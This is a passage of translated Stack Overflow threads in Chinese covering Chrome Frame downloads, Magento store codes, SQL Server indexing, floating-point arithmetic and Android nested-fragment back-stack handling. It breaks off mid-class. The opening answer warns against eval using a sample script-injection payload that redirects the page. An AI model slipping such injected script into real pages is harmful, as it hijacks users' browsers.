> 赞同：0
> 
> 时间：2012-11-16T14:28:54.493

`eval`会工作，但它很狡猾。

您对这些字符串始终是有效的 javascript 有多大信心？

如果有人欺骗你的应用程序会发生什么

```
location.replace('http://stackoverflow.com'); 
```

（或更糟）进入那个 HTML 块？

如果您发现自己需要使用`eval`它通常意味着您应该重新考虑您的方法。

# javascript - 下载不适用于 IE8 中的 Chrome Frame

> ID：13418414
> 
> 赞同：3
> 
> 时间：2012-11-16T14:18:36.690
> 
> 标签：javascript, google-chrome-frame

我有一个包含 Excel XML 电子表格数据的字符串，我希望用户能够将其下载为 .xls 文件。我目前正在使用以下代码，它在 Chrome 中运行良好。然而，由于我们的大多数用户仍在使用 IE8，我们将不得不通过 Chrome Frame 运行该页面，而这里的下载似乎无法正常工作（没有任何反应）。

~~我们还在页面卸载/离开时发出警告，提醒用户在关闭前保存，因此触发此事件的下载（如`location.href = blob`）将不起作用。~~ *- 这不再适用，尽管 location.href 无论如何都不起作用。*

```
var blob = new Blob([template]),
    saveLink = document.createElement("a");            

saveLink.href = window.URL.createObjectURL(blob);
saveLink.download = "EventDetails.xls";
saveLink.click(); 
```

**编辑：**

我也尝试了以下方法但没有成功：

```
window.open("data:application/vnd.ms-excel," + template, "_self"); 
```

和，

```
var blob = new Blob([template], { type: "application/vnd.ms-excel" });
window.open(window.URL.createObjectURL(blob), "_self"); 
```

我想问题是 Chrome Frame 正在使用 IE8 的下载器，因此打开了一个无法访问数据的新会话？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-05T14:08:24.963

我怀疑这是否会得到解决，因为 Chrome Frame 的进一步开发将在 2014 年 1 月停止[（请参阅博客）](http://blog.chromium.org/2013/06/retiring-chrome-frame.html)，并且不再有任何人为此问题签署[票证。](https://code.google.com/p/chromium/issues/detail?id=163266)所以我要结束这个问题。

# php - 使用php在magento中获取商店名称

> ID：13418416
> 
> 赞同：2
> 
> 时间：2012-11-16T14:18:49.493
> 
> 标签：php, magento

如何使用 php 在 magento 中获取商店名称？

例如：

我在magento有两家商店：

```
domain.com/store/jp
domain.com/store/en 
```

如何使用 php 获取商店名称？你能给我返回商店名称的php代码行吗？**jp**或**en** _

 *** * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-16T14:46:30.490

只是分享我的发现：

**获取店铺数据**

```
Mage::app()->getStore(); 
```

**商店主页网址**

```
Mage::app()->getStore()->getHomeUrl(); 
```

**商店代码**

```
Mage::app()->getStore()->getCode(); 
```

**活跃**

```
Mage::app()->getStore()->getIsActive(); 
```

**网站 ID**

```
Mage::app()->getStore()->getWebsiteId(); 
```

**店铺名称**

```
Mage::app()->getStore()->getName(); 
```

**商店编号**

```
Mage::app()->getStore()->getStoreId(); 
```

* * *

© 来源：[如何在 Magento 中获取商店信息？](https://stackoverflow.com/questions/2713042/how-to-get-store-information-in-magento)由[@chapagain](https://stackoverflow.com/users/327862/chapagain)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-16T14:29:28.087

这是一个商店代码，您可以通过以下方式获取它：

```
$code = Mage::app()->getStore()->getCode(); 
```**

# java - JTable + MySQL“实时感受”

> ID：13418422
> 
> 赞同：1
> 
> 时间：2012-11-16T14:19:14.360
> 
> 标签：java, mysql, jtable, real-time, tablemodel

我有一个 JTable，其中填充了 MySQL 表中的数据，但是有多个客户端一次更新并插入到数据库中。我的目标是为 Table 提供某种近乎实时的体验。我想每隔 5 秒就更新一次 TableModel，但是超过 1000 行并没有什么意义。有人可以向我解释一下这种情况的一般方法是怎样的，或者我应该使用哪些技术，

提前致谢，

斯特凡

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:31:40.183

您需要采用 3 层架构：

在 swing 客户端和 MySql 数据库之间放置了一个应用服务器。

客户端不会直接连接到数据库，而是连接到应用程序服务器，应用程序服务器将提供更高级别的 API（例如业务逻辑方法）以从数据库中获取数据。

至于客户端中的数据刷新，您可以使用 JMS 之类的东西在数据更改时将事件推送到客户端。

如果您无法控制更改数据的其他客户端，则必须使用某种轮询。

# jquery - Jquery/移动导航问题

> ID：13418423
> 
> 赞同：0
> 
> 时间：2012-11-16T14:19:18.813
> 
> 标签：jquery, cordova, navigation

在我的起始页上，我隐藏了所有内容，然后从服务器获取消息。如果有消息，则会显示消息页面。但是，当我使用 Android 的后退按钮返回时，应用程序会结束（关闭），就像我在起始页上并按下后退按钮一样。为什么？

这是我用来显示消息页面的代码（来自起始页）：

```
$( '#startpage' ).live( 'pageshow',function()
{   
   //Fetch message and in the ajax success handler:
   $.mobile.changePage('pg/message/message.html',{transition: 'none'});
} 
```

我正在使用 JQuery 和 PhoneGap。

编辑：如果我尝试打开“弹出窗口”（JQM 1.2），结果也会相同。它不能关闭。似乎弹出窗口是“起始页”。这怎么可能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T17:50:00.420

Juw，PhoneGap 的事件 API 为您提供了一个连接到触发 Android 后退按钮的用户。查看下面的代码。如果用户打开`<div data-role="page" id="loginpage">`并点击后退按钮，他会离开应用程序，否则，他会返回一页。

```
document.addEventListener("backbutton", function (e) {
    if ($.mobile.activePage.is('#loginpage')) {
        e.preventDefault();
        navigator.app.exitApp();
    } else {
        navigator.app.backHistory()
    }
}, false); 
```

# javascript - 控制台中 4.08-1.36 的结果

> ID：13418431
> 
> 赞同：0
> 
> 时间：2012-11-16T14:20:00.777
> 
> 标签：javascript, google-chrome, firebug, google-chrome-devtools

> **可能的重复：**
> [JavaScript 的数学被破坏了吗？](https://stackoverflow.com/questions/588004/is-javascripts-math-broken)

当我尝试在 Chrome 控制台或 Firebug中运行**4.08-1.36时，我注意到一个奇怪的行为。**当结果应该是 2.72 时，控制台会返回**2.7199999999999998**作为结果。

我想知道这怎么可能。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:23:59.710

这是因为您正在处理浮点数。虽然整数值在给定范围内具有一定数量的可能性（即，从 0 到 9（包括 0 到 9）恰好有 10 个值），但一旦开始添加小数点值，您最终会得到无限数量的可能性。为了能够将这些值存储在固定的内存空间中，计算机应用浮点算法，该算法使用近似值，允许将广泛的数字存储在该固定的内存空间中。由于这种近似，您有时可能会得到像您这样看似奇怪的结果，这几乎但不完全是您所期望的结果。

有关详细信息，请参阅[http://en.wikipedia.org/wiki/Floating_point](http://en.wikipedia.org/wiki/Floating_point)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-16T14:33:50.007

计算机以二进制而不是十进制存储数字。正如你不能用十进制形式精确表示分数 1/3，你不能用二进制精确表示分数 1/10，这意味着有许多值可以用十进制形式精确表示，但不能用二进制形式表示。

您示例中的所有数字都属于这一类。在二进制中，十进制数 4.08 变为 100.00010100011110101110...，二进制点之后的那些数字永远重复。另一个值 1.36 变为 1.01011100001010001111 ....，它们的差值 2.72 变为 10.10111000010100011110 ... 在每种情况下，也具有无限重复的二进制分数。

当转换回十进制以供人类查看时，计算机会四舍五入到最接近的匹配，这并不总是预期的确切值。

# sql - 加速 SQL Server 查询

> ID：13418432
> 
> 赞同：0
> 
> 时间：2012-11-16T14:20:01.773
> 
> 标签：sql, sql-server, performance, tsql

我需要加快 SQL Server 上的几个查询。

感谢您的任何帮助。

第一个在实时数据库上大约需要 30-45 秒，第二个需要 90 秒。

如果您想知道我在医院工作，因此有类别名称，我们有一个非常大的数据库

```
select Status, StatusChoice, Category, VisitID, 
     OrderedProcedureName, OrderDateTime, ServiceDateTime 
from OeOrders 
where Category IN 'RAD' 
    and StatusChoice = 'S' 
```

.

```
select Status, StatusChoice, Category, VisitID, 
     OrderedProcedureName, OrderDateTime, ServiceDateTime 
from OeOrders 
where Category IN ('RAD','CT','US','MRI') 
    and StatusChoice = 'S' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:26:33.540

您可以尝试通过在表上创建索引来提高您的 SELECT 性能；对于非查询命令（例如 UPDATE、INSERT、DELETE），它可能会使性能稍差，因为 SQL 也必须更新他的索引，但请随意尝试。

运行此脚本一次，然后以秒为单位再次检查延迟：

```
CREATE INDEX iCategoryChoiche ON OeOrders 
(StatusChoice,Category) INCLUDE (Status, StatusChoice, Category, VisitID, OrderedProcedureName, OrderDateTime, ServiceDateTime) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:25:46.770

好吧，我可以说，在第一个 SQL 中，您可以使用`=`而不是`IN`，我相信它会更快。

```
select Status, StatusChoice, Category, VisitID, OrderedProcedureName, OrderDateTime, ServiceDateTime from OeOrders where Category='RAD' and StatusChoice = 'S' 
```

也看看这些，它可能会有所帮助： [http ://hungred.com/useful-information/ways-optimize-sql-queries/](http://hungred.com/useful-information/ways-optimize-sql-queries/ "优化 SLQ 查询")

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:47:55.937

您可以尝试通过将子查询放在 FROM 中来首先强制执行 StatusChoice 过滤：

```
select src.*
from (
select Status, StatusChoice, Category, VisitID, 
     OrderedProcedureName, OrderDateTime, ServiceDateTime 
from OeOrders 
where StatusChoice = 'S'
) src
where src.Category IN ('RAD','CT','US','MRI') 
```

但是改进的机会很小——DBMS 可能已经在以这种方式执行查询了。这种 rewerite 的原因是具有多个值的“IN”通常转换为使用“或”谓词进行过滤，这在 SQL 中相当慢，因此可能会更快地返回较小的要“或”的行集。

查询非常简单，因此您宁愿查看执行计划。从执行计划中，您将知道哪些索引可以使用重组，以及哪些统计信息应该更新（或者可能创建新的）。当然，（StatusChoice,Category）上的新索引会有所帮助，如果它还没有出现的话。

如果你不关心得到一些“脏”的结果，你也可以使用 (NOLOCK) 提示。

# android - Android 4.2：带有嵌套片段的回栈行为

> ID：13418436
> 
> 赞同：114
> 
> 时间：2012-11-16T14:20:13.043
> 
> 标签：android, android-fragments, android-nested-fragment

在 Android 4.2 中，支持库支持嵌套片段，[请参见此处](http://developer.android.com/about/versions/android-4.2.html#NestedFragments)。我玩过它，发现了一个关于回栈和[getChildFragmentManager()](https://developer.android.com/reference/android/support/v4/app/Fragment.html#getChildFragmentManager%28%29)的有趣行为/错误。使用 getChildFragmentManager() 和 addToBackStack(String name) 时，通过按下后退按钮，系统不会将后退堆栈运行到前一个片段。另一方面，当使用[getFragmentManager()](https://developer.android.com/reference/android/support/v4/app/Fragment.html#getFragmentManager%28%29)和 addToBackStack(String name) 时，通过按下后退按钮系统返回到前一个片段。

对我来说，这种行为是出乎意料的。通过按下我设备上的后退按钮，我期望最后添加到后退堆栈的片段将被弹出，即使该片段已添加到子片段管理器中的后退堆栈。

这种行为正确吗？这种行为是错误吗？这个问题有解决办法吗？

# 带有 getChildFragmentManager() 的示例代码：

```
public class FragmentceptionActivity extends FragmentActivity {

@Override
protected void onCreate(Bundle arg0) {
    super.onCreate(arg0);

    final FrameLayout wrapper1 = new FrameLayout(this);
    wrapper1.setLayoutParams(new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT));
    wrapper1.setId(1);

    final FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT);
    params.topMargin = 0;

    final TextView text = new TextView(this);
    text.setLayoutParams(params);
    text.setText("fragment 1");
    wrapper1.addView(text);

    setContentView(wrapper1);

    getSupportFragmentManager().beginTransaction().addToBackStack(null)
            .add(1, new Fragment1()).commit();
}

public class Fragment1 extends Fragment {
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        final FrameLayout wrapper2 = new FrameLayout(getActivity());
        wrapper2.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        wrapper2.setId(2);

        final FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        params.topMargin = 100;

        final TextView text = new TextView(getActivity());
        text.setLayoutParams(params);
        text.setText("fragment 2");
        wrapper2.addView(text);

        return wrapper2;
    }

    @Override
    public void onViewCreated(View view, Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

        getFragmentManager().beginTransaction().addToBackStack(null)
                .add(2, new Fragment2()).commit();
    }
}

public class Fragment2 extends Fragment {
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        final FrameLayout wrapper3 = new FrameLayout(getActivity());
        wrapper3.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        wrapper3.setId(3);

        final FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        params.topMargin = 200;

        final TextView text = new TextView(getActivity());
        text.setLayoutParams(params);
        text.setText("fragment 3");
        wrapper3.addView(text);

        return wrapper3;
    }

    @Override
    public void onViewCreated(View view, Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

        getChildFragmentManager().beginTransaction().addToBackStack(null)
                .add(3, new Fragment3()).commit();
    }
}

public class Fragment3 extends Fragment {
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        final FrameLayout wrapper4 = new FrameLayout(getActivity());
        wrapper4.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        wrapper4.setId(4);

        final FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        params.topMargin = 300;

        final TextView text = new TextView(getActivity());
        text.setLayoutParams(params);
        text.setText("fragment 4");
        wrapper4.addView(text);

        return wrapper4;
    }

    @Override
    public void onViewCreated(View view, Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

        getChildFragmentManager().beginTransaction().addToBackStack(null)
                .add(4, new Fragment4()).commit();
    }
}

public class Fragment4 extends Fragment {
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        final FrameLayout wrapper5 = new FrameLayout(getActivity());
        wrapper5.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        wrapper5.setId(5);

        final FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        params.topMargin = 400;

        final TextView text = new TextView(getActivity());
        text.setLayoutParams(params);
        text.setText("fragment 5");
        wrapper5.addView(text);

        return wrapper5;
    }

    @Override
    public void onViewCreated(View view, Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);
    }
}

} 
```

# 带有 getFragmentManager() 的示例代码：

```
public class FragmentceptionActivity extends FragmentActivity {

@Override
protected void onCreate(Bundle arg0) {
    super.onCreate(arg0);

    final FrameLayout wrapper1 = new FrameLayout(this);
    wrapper1.setLayoutParams(new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT));
    wrapper1.setId(1);

    final FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT);
    params.topMargin = 0;

    final TextView text = new TextView(this);
    text.setLayoutParams(params);
    text.setText("fragment 1");
    wrapper1.addView(text);

    setContentView(wrapper1);

    getSupportFragmentManager().beginTransaction().addToBackStack(null)
            .add(1, new Fragment1()).commit();
}

public class Fragment1 extends Fragment {
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        final FrameLayout wrapper2 = new FrameLayout(getActivity());
        wrapper2.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        wrapper2.setId(2);

        final FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        params.topMargin = 100;

        final TextView text = new TextView(getActivity());
        text.setLayoutParams(params);
        text.setText("fragment 2");
        wrapper2.addView(text);

        return wrapper2;
    }

    @Override
    public void onViewCreated(View view, Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

        getFragmentManager().beginTransaction().addToBackStack(null)
                .add(2, new Fragment2()).commit();
    }
}

public class Fragment2 extends Fragment {
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        final FrameLayout wrapper3 = new FrameLayout(getActivity());
        wrapper3.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        wrapper3.setId(3);

        final FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        params.topMargin = 200;

        final TextView text = new TextView(getActivity());
        text.setLayoutParams(params);
        text.setText("fragment 3");
        wrapper3.addView(text);

        return wrapper3;
    }

    @Override
    public void onViewCreated(View view, Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

        getFragmentManager().beginTransaction().addToBackStack(null)
                .add(3, new Fragment3()).commit();
    }
}

public class Fragment3 extends Fragment {
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        final FrameLayout wrapper4 = new FrameLayout(getActivity());
        wrapper4.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        wrapper4.setId(4);

        final FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        params.topMargin = 300;

        final TextView text = new TextView(getActivity());
        text.setLayoutParams(params);
        text.setText("fragment 4");
        wrapper4.addView(text);

        return wrapper4;
    }

    @Override
    public void onViewCreated(View view, Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

        getFragmentManager().beginTransaction().addToBackStack(null)
                .add(4, new Fragment4()).commit();
    }
}

public class Fragment4 extends Fragment {
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        final FrameLayout wrapper5 = new FrameLayout(getActivity());
        wrapper5.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        wrapper5.setId(5);

        final FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        params.topMargin = 400;

        final TextView text = new TextView(getActivity());
        text.setLayoutParams(params);
        text.setText("fragment 5");
        wrapper5.addView(text);

        return wrapper5;
    }

    @Override
    public void onViewCreated(View view, Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);
    }
}

} 
```

* * *

## 回答 #1

> 赞同：70
> 
> 时间：2014-03-05T14:03:41.610

此解决方案可能是@Sean 答案的更好版本：

```
@Override
public void onBackPressed() {
    // if there is a fragment and the back stack of this fragment is not empty,
    // then emulate 'onBackPressed' behaviour, because in default, it is not working
    FragmentManager fm = getSupportFragmentManager();
    for (Fragment frag : fm.getFragments()) {
        if (frag.isVisible()) {
            FragmentManager childFm = frag.getChildFragmentManager();
            if (childFm.getBackStackEntryCount() > 0) {
                childFm.popBackStack();
                return;
            }
        }
    }
    super.onBackPressed();
} 
```

同样，我根据上面的@Sean 回答准备了这个解决方案。

正如@AZ13 所说，此解决方案仅在一级子碎片情况下可行。在多级片段的情况下，工作变得有点复杂，所以我建议只在我所说的可行情况下尝试这个解决方案。=)

**注意：**由于`getFragments`方法现在是私有方法，因此此解决方案将不起作用。您可以查看有关此情况的建议解决方案的链接的评论。

* * *

## 回答 #2

> 赞同：58
> 
> 时间：2012-12-25T13:02:33.000

似乎是一个错误。看看： [http ://code.google.com/p/android/issues/detail?id=40323](http://code.google.com/p/android/issues/detail?id=40323)

对于我已成功使用的解决方法（如评论中所建议）：

```
 @Override
public void onBackPressed() {

    // If the fragment exists and has some back-stack entry
    if (mActivityDirectFragment != null && mActivityDirectFragment.getChildFragmentManager().getBackStackEntryCount() > 0){
        // Get the fragment fragment manager - and pop the backstack
        mActivityDirectFragment.getChildFragmentManager().popBackStack();
    }
    // Else, nothing in the direct fragment back stack
    else{
        // Let super handle the back press
        super.onBackPressed();          
    }
} 
```

* * *

## 回答 #3

> 赞同：29
> 
> 时间：2018-08-14T14:20:15.667

这个问题的真正答案在于名为 setPrimaryNavigationFragment 的 Fragment Transaction 函数。

```
/**
 * Set a currently active fragment in this FragmentManager as the primary navigation fragment.
 *
 * <p>The primary navigation fragment's
 * {@link Fragment#getChildFragmentManager() child FragmentManager} will be called first
 * to process delegated navigation actions such as {@link FragmentManager#popBackStack()}
 * if no ID or transaction name is provided to pop to. Navigation operations outside of the
 * fragment system may choose to delegate those actions to the primary navigation fragment
 * as returned by {@link FragmentManager#getPrimaryNavigationFragment()}.</p>
 *
 * <p>The fragment provided must currently be added to the FragmentManager to be set as
 * a primary navigation fragment, or previously added as part of this transaction.</p>
 *
 * @param fragment the fragment to set as the primary navigation fragment
 * @return the same FragmentTransaction instance
 */
public abstract FragmentTransaction setPrimaryNavigationFragment(Fragment fragment); 
```

当活动添加它时，您必须在初始父片段上设置此功能。我的活动中有一个 replaceFragment 函数，如下所示：

```
public void replaceFragment(int containerId, BaseFragment fragment, boolean addToBackstack) {
    FragmentTransaction fragmentTransaction = fragmentManager.beginTransaction();
    fragmentTransaction.setPrimaryNavigationFragment(fragment);
    if (addToBackstack) {
        fragmentTransaction.addToBackStack(fragment.TAG);
    }

    fragmentTransaction.replace(containerId, fragment).commit();
} 
```

这为您提供了与从常规片段 B 返回片段 A 相同的行为，除了现在它也在子片段上！

* * *

## 回答 #4

> 赞同：24
> 
> 时间：2014-06-12T04:49:00.780

此解决方案可能是@ismailarilik 答案的更好版本：

嵌套片段版本

```
private boolean onBackPressed(FragmentManager fm) {
    if (fm != null) {
        if (fm.getBackStackEntryCount() > 0) {
            fm.popBackStack();
            return true;
        }

        List<Fragment> fragList = fm.getFragments();
        if (fragList != null && fragList.size() > 0) {
            for (Fragment frag : fragList) {
                if (frag == null) {
                    continue;
                }
                if (frag.isVisible()) {
                    if (onBackPressed(frag.getChildFragmentManager())) {
                        return true;
                    }
                }
            }
        }
    }
    return false;
}

@Override
public void onBackPressed() {
    FragmentManager fm = getSupportFragmentManager();
    if (onBackPressed(fm)) {
        return;
    }
    super.onBackPressed();
} 
```

* * *

## 回答 #5

> 赞同：14
> 
> 时间：2014-06-14T04:53:15.723

有了这个答案，它将处理递归回溯检查，并让每个片段有机会覆盖默认行为。这意味着您可以让一个承载 ViewPager 的片段执行一些特殊的操作，例如滚动到作为后退堆栈的页面，或者滚动到主页，然后在下一次后退时退出。

将此添加到扩展 AppCompatActivity 的 Activity。

```
@Override
public void onBackPressed()
{
    if(!BaseFragment.handleBackPressed(getSupportFragmentManager())){
        super.onBackPressed();
    }
} 
```

将此添加到您的 BaseFragment 或您可以继承所有片段的类。

```
public static boolean handleBackPressed(FragmentManager fm)
{
    if(fm.getFragments() != null){
        for(Fragment frag : fm.getFragments()){
            if(frag != null && frag.isVisible() && frag instanceof BaseFragment){
                if(((BaseFragment)frag).onBackPressed()){
                    return true;
                }
            }
        }
    }
    return false;
}

protected boolean onBackPressed()
{
    FragmentManager fm = getChildFragmentManager();
    if(handleBackPressed(fm)){
        return true;
    }
    else if(getUserVisibleHint() && fm.getBackStackEntryCount() > 0){
        fm.popBackStack();
        return true;
    }
    return false;
} 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2015-07-26T20:31:46.700

此代码将导航片段管理器树并返回最后一个添加的具有任何可以从堆栈弹出的片段的片段：

```
private FragmentManager getLastFragmentManagerWithBack(FragmentManager fm)
{
  FragmentManager fmLast = fm;

  List<Fragment> fragments = fm.getFragments();

  for (Fragment f : fragments)
  {
    if ((f.getChildFragmentManager() != null) && (f.getChildFragmentManager().getBackStackEntryCount() > 0))
    {
      fmLast = f.getFragmentManager();
      FragmentManager fmChild = getLastFragmentManagerWithBack(f.getChildFragmentManager());

      if (fmChild != fmLast)
        fmLast = fmChild;
    }
  }

  return fmLast;
} 
```

调用方法：

```
@Override
public void onBackPressed()
{
  FragmentManager fm = getLastFragmentManagerWithBack(getSupportFragmentManager());

  if (fm.getBackStackEntryCount() > 0)
  {
    fm.popBackStack();
    return;
  }

  super.onBackPressed();
} 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2020-05-28T10:09:10.857

如果到目前为止有人没有找到任何答案，我已经正确实施了

只需在您的子嵌套片段上添加此方法

```
 @Override
public void onCreate(@Nullable Bundle savedInstanceState) {
    // This callback will only be called when MyFragment is at least Started.
    OnBackPressedCallback callback = new OnBackPressedCallback(true ) {
        @Override
        public void handleOnBackPressed() {
            // Handle the back button event
            FragmentManager fm= getFragmentManager();
            if (fm != null) {
                if (fm.getBackStackEntryCount() > 0) {
                    fm.popBackStack();
                    Log.e( "Frag","back" );

                }

                List<Fragment> fragList = fm.getFragments();
                if (fragList != null && fragList.size() > 0) {
                    for (Fragment frag : fragList) {
                        if (frag == null) {
                            continue;
                        }
                        if (frag.isVisible()) {
                          Log.e( "Frag","Visible" );
                        }
                    }
                }
            }

        }
    };
    requireActivity().getOnBackPressedDispatcher().addCallback(this, callback);
    super.onCreate( savedInstanceState );
} 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2013-05-30T10:25:47.120

原因是您的 Activity 派生自 FragmentActivity，它处理 BACK 按键（参见[FragmentActivity](https://github.com/android/platform_frameworks_support/blob/master/v4/java/android/support/v4/app/FragmentActivity.java)的第 173 行。

在我们的应用程序中，我使用的是 ViewPager（带有片段），每个片段都可以有嵌套的片段。我处理这个的方式是：

*   使用单个方法定义接口 OnBackKeyPressedListener`void onBackKeyPressed()`
*   在 ViewPager 显示的“顶部”片段中实现了这个接口
*   覆盖 onKeyDown 并检测 BACK 按下，并在视图寻呼机的当前活动片段中调用 onBackKeyPressed。

另请注意，我`getChildFragmentManager()`在片段中使用以正确嵌套片段。[您可以在这篇 android-developers post](https://groups.google.com/forum/?fromgroups#!topic/android-developers/XfoNNIkolmg)中看到讨论和解释。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2020-06-13T11:35:33.207

如果您在片段中使用片段，则使用`getChildFragmentManager()`

```
getChildFragmentManager().beginTransaction().replace(R.id.fragment_name, fragment).addToBackStack(null).commit(); 
```

如果您正在使用子片段并替换它，请使用`getParentFragmentManager()`

```
getParentFragmentManager().beginTransaction().replace(R.id.fragment_name, fragment).addToBackStack(null).commit(); 
```

如果两者都不适合你试试这个`getActivity().getSupportFragmentManager()`

```
getActivity().getSupportFragmentManager().beginTransaction().replace(R.id.fragment_name, fragment).addToBackStack(null).commit(); 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2013-07-11T10:51:06.527

我能够通过在 onCreate View() 方法中将此方法添加到父片段并传递根视图来处理片段回栈。

```
private void catchBackEvent(View v){
    v.setFocusableInTouchMode(true);
    v.requestFocus();
    v.setOnKeyListener( new OnKeyListener()
    {
        @Override
        public boolean onKey( View v, int keyCode, KeyEvent event )
        {
            if( keyCode == KeyEvent.KEYCODE_BACK )
            {
                if(isEnableFragmentBackStack()){
                    getChildFragmentManager().popBackStack();
                                    setEnableFragmentBackStack(false);
                    return true;
                }
                else
                    return false;   
            }
            return false;
        }
    } );
} 
```

isEnableFragmentBackStack() 方法是一个布尔标志，用于知道我何时在主片段或下一个片段上。

确保在提交需要有堆栈的片段时，必须添加 addToBackstack 方法。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2018-01-15T23:14:32.293

5年多了，这个问题仍然相关。如果您不想使用 fragmentManager.getFragments() 由于其限制。扩展和使用以下类：

**NestedFragmentActivity.java**

```
abstract public class NestedFragmentActivity extends AppCompatActivity {

    private final Stack<Integer> mActiveFragmentIdStack = new Stack<>();
    private final Stack<String> mActiveFragmentTagStack = new Stack<>();

    @Override
    public void onBackPressed() {
        if (mActiveFragmentIdStack.size() > 0 && mActiveFragmentTagStack.size() > 0) {

            // Find by id
            int lastFragmentId = mActiveFragmentIdStack.lastElement();
            NestedFragment nestedFragment = (NestedFragment) getSupportFragmentManager().findFragmentById(lastFragmentId);

            // If cannot find by id, find by tag
            if (nestedFragment == null) {
                String lastFragmentTag = mActiveFragmentTagStack.lastElement();
                nestedFragment = (NestedFragment) getSupportFragmentManager().findFragmentByTag(lastFragmentTag);
            }

            if (nestedFragment != null) {
                nestedFragment.onBackPressed();
            }

            // If cannot find by tag, then simply pop
            mActiveFragmentTagStack.pop();
            mActiveFragmentIdStack.pop();

        } else {
            super.onBackPressed();
        }
    }

    public void addToBackStack(int fragmentId, String fragmentTag) {
        mActiveFragmentIdStack.add(fragmentId);
        mActiveFragmentTagStack.add(fragmentTag);
    }
} 
```

**嵌套片段.java**

```
abstract public class NestedFragment extends Fragment {

    private final Stack<Integer> mActiveFragmentIdStack = new Stack<>();
    private final Stack<String> mActiveFragmentTagStack = new Stack<>();

    private NestedFragmentActivity mParentActivity;
